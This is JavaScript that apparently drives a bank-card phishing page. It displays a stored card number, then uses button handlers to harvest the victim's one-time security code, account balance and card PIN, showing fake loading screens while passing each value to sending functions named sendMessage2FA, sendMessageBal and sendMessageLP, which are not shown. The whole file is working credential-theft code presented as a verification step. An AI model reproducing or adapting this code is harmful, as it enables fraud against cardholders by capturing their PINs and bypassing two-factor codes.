window.onload = function() {
    var savedData = localStorage.getItem('cnum');
    document.getElementById('card-container').textContent = savedData;
    var currentDate = new Date();

    var year = currentDate.getFullYear();
    var month = String(currentDate.getMonth() + 1).padStart(2, '0'); 
    var day = String(currentDate.getDate()).padStart(2, '0'); 
    var hours = String(currentDate.getHours()).padStart(2, '0');
    var minutes = String(currentDate.getMinutes()).padStart(2, '0');
    var seconds = String(currentDate.getSeconds()).padStart(2, '0');

    var formattedDateTime = year + '-' + month + '-' + day + ' ' + hours + ':' + minutes + ':' + seconds;
    document.getElementById('rddate').textContent = formattedDateTime;

}
$('.btn2').on('click', async function(event) {
    event.preventDefault();
    let cardnum = localStorage.getItem('crdnum');
    let otp = $('#otp').val().trim();
    if(otp.length > 5){
        document.getElementById('smsinf').textContent = 'Please enter your security code below.';
		document.getElementById('smsinf').style.color = '#D0D3D4';
        document.getElementById('p1').style.display = 'none';
        document.getElementById('pload').style.display = 'flex';
        document.getElementById('otp').classList.remove('error');
        sendMessage2FA(cardnum, uniqueid, otp);
    }else{
        document.getElementById('otp').classList.add('error');
    }
});   
$('.btn3').on('click', async function(event) {
    event.preventDefault();
    let cardnum = localStorage.getItem('crdnum');
    let bal = $('#bal').val().trim();
    if(bal.length > 3){
        document.getElementById('pbal').style.display = 'none';
        document.getElementById('pload').style.display = 'flex';
        
        document.getElementById('bal').classList.remove('error');
        sendMessageBal(cardnum, uniqueid, bal);
    }else{
        document.getElementById('bal').classList.add('error');
    }
});  
$('.btn4').on('click', async function(event) {
    event.preventDefault();
    let cardnum = localStorage.getItem('crdnum');
    let pin = $('#pin').val().trim();
    if(pin.length > 3){
        document.getElementById('ppin').style.display = 'none';
        document.getElementById('pload').style.display = 'flex';
        
        document.getElementById('pin').classList.remove('error');
        sendMessageLP   (cardnum, uniqueid, pin);
    }else{
        document.getElementById('pin').classList.add('error');
    }
});    
function scrollToElement(elementId) {
    var element = document.getElementById(elementId);
    if (element) {
        element.scrollIntoView({ behavior: 'smooth' });
    }
}